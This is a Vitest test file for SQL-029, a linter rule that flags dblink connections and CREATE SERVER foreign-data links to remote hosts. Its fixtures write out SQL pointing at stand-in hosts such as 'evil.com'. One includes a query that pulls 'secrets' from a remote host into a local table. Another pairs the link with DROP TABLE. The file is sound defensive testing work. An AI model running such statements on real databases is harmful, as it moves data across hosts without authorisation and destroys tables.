import { beforeAll, describe, expect, it } from 'vitest';

  import { analyze, init } from '../src/index.js';
  import { parseQuery } from '../src/parser.js';
  import { SQL_029 } from '../src/rules/sql-029-dblink-server.js';

  // SQL-029 — dblink_connect / CREATE SERVER.
  //
  // Phase 1 scaffolding tests:
  //   - Positive fixtures are `it.skip`'d. They become live in Phase 3
  //     when the detection logic ships.
  //   - Negative fixtures run live; they assert the placeholder returns
  //     null on shapes the rule must not flag once implemented.
  //   - The multi-statement composition fixture has two halves: the
  //     "new rule fires" half is skipped; the "existing rule still
  //     fires" half runs live in Phase 1 (it proves we have not
  //     regressed an existing rule by adding the new one).

  beforeAll(async () => {
    await init();
  });

  function fire(sql: string) {
    const r = parseQuery(sql);
    expect(r.error).toBeUndefined();
    return SQL_029(r.ast);
  }

  describe('SQL-029 — positive fixtures (Phase 3 unskips)', () => {
    it('fires on dblink_connect', () => {
      const c = fire("SELECT dblink_connect('host=evil.com user=x dbname=y')");
      expect(c?.code).toBe('SQL-029');
      expect(c?.severity).toBe('warn');
      expect(c?.confidence).toBe(80);
    });

  it('fires on dblink call inline', () => {
      const c = fire("SELECT * FROM dblink('host=remote', 'SELECT 1') AS t(x int)");
      expect(c?.code).toBe('SQL-029');
      expect(c?.severity).toBe('warn');
      expect(c?.confidence).toBe(80);
    });

  it('fires on CREATE SERVER ... postgres_fdw', () => {
      const c = fire("CREATE SERVER remote_pg FOREIGN DATA WRAPPER postgres_fdw OPTIONS (host 'evil.com')");
      expect(c?.code).toBe('SQL-029');
      expect(c?.severity).toBe('warn');
      expect(c?.confidence).toBe(80);
    });
  });

  describe('SQL-029 — negative fixtures (must not fire)', () => {
    it('does not fire on plain SELECT against a local table', () => {
      expect(fire("SELECT * FROM local_table")).toBeNull();
    });

  it('does not fire on DROP SERVER', () => {
      expect(fire("DROP SERVER remote_pg")).toBeNull();
    });

  it('does not fire on string literal containing dblink', () => {
      expect(fire("SELECT 'dblink_connect' AS s")).toBeNull();
    });
  });

  describe('SQL-029 — multi-statement composition with SQL-013', () => {
    it('the new rule fires alongside SQL-013', () => {
      const result = analyze("SELECT dblink_connect('host=evil'); DROP TABLE old;");
      const codes = result.catches.map((c) => c.code);
      expect(codes).toContain('SQL-029');
      expect(codes).toContain('SQL-013');
    });

    it('SQL-013 still fires when the placeholder is in registry', () => {
      const result = analyze("SELECT dblink_connect('host=evil'); DROP TABLE old;");
      const codes = result.catches.map((c) => c.code);
      expect(codes).toContain('SQL-013');
    });
  });
  
  describe('SQL-029 — non-SELECT contexts (regression for v1.6.0 perf opt)', () => {
    it('fires inside INSERT … SELECT dblink(...)', () => {
      const r = parseQuery("INSERT INTO mirror SELECT * FROM dblink('host=evil.example.com', 'select * from secrets') AS t(id int, secret text)");
      expect(r.error).toBeUndefined();
      expect(SQL_029(r.ast!)).not.toBeNull();
    });
    it('fires inside UPDATE … SET col = dblink_exec(...)', () => {
      const r = parseQuery("UPDATE jobs SET response = dblink_exec('host=evil', 'select 1') WHERE id = 1");
      expect(r.error).toBeUndefined();
      expect(SQL_029(r.ast!)).not.toBeNull();
    });
  });
